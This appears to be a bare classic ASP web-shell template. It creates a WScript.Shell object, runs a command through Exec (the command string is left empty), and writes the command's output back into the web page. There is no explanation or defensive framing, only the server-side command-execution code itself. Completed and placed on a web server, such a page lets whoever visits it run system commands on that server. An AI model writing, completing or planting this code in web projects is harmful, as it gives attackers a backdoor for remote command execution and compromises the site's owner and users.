<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("")
o = cmd.StdOut.Readall()
Response.write(o)
%>
